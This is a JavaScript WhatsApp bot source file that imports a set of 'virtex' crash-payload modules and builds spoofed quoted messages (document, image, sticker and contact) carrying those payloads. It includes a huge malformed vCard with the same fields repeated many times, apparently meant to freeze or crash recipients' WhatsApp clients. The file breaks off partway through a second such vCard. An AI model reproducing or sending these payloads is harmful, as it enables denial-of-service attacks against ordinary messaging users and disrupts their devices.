/**
   * Create By IKYY MAKERZ
   * Base by Dika Ardnt
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { buttonvirus } = require('./virtex/buttonvirus')
const { buttonfour } = require('./virtex/buttonfour')
const { virusv1 } = require('./virtex/virusv1')
const { virusv3 } = require('./virtex/virusv3')
const { iphone } = require('./virtex/iphone')
const { philips } = require('./virtex/philips')
const { kanjut } = require('./virtex/kanjut')
const { doctext } = require('./virtex/doctext')
const { bugweb } = require('./virtex/bugweb')
const { ngazap } = require('./virtex/ngazap')
const { virusloc } = require('./virtex/virusloc')
const { viruskon } = require('./virtex/viruskon')
const { ikybabel } = require('./virtex/ikybabel')
const { doc } = require('./virtex/doc')
const { four } = require('./virtex/four')
const { ikyenak } = require('./virtex/ikyenak')
const { ikyenak2 } = require('./virtex/ikyenak2')
const { virtex1 } = require('./virtex/virtex1')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { intro } = require('./src/intro')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
virgam = fs.readFileSync(`./src/virgam yg ganas.jpeg`)

// tes simi


// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const banned = JSON.parse(fs.readFileSync('./lib/banned.json'))
const { color, bgcolor } = require('./lib/color')
module.exports = ikycoli = async (ikycoli, m, chatUpdate, store) => {
ikycoli.readMessages([m.key])

    try {
    //console.log(nomerOwner)
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const isGroup = body.endsWith('@g.us')
        const sender = isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0] 
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await ikycoli.decodeJid(ikycoli.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const isBan = banned.includes(m.sender)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const from = mek.key.remoteJid
	
        // Group
        const groupMetadata = m.isGroup ? await ikycoli.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const welcm = m.isGroup ? wlcm.includes(from) : true
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const forward = {forwardingScore: 10, isForwarded: true, sendEphemeral: true}
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
autorespon = true

const ikyzyx = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${ikybabel}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}


const ikygamzyx = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${ikybabel}`, 
"jpegThumbnail": virgam
} 
} 
}

const fsticjo = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"jpegThumbnail": virgam,
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}}}

const fkntliky = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE IKY BOTZ\n${ikybabel}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE IKY BOTZ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD`,
"jpegThumbnail": virgam }}}

const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE IKYY BOTZ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE IKYY BOTZ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 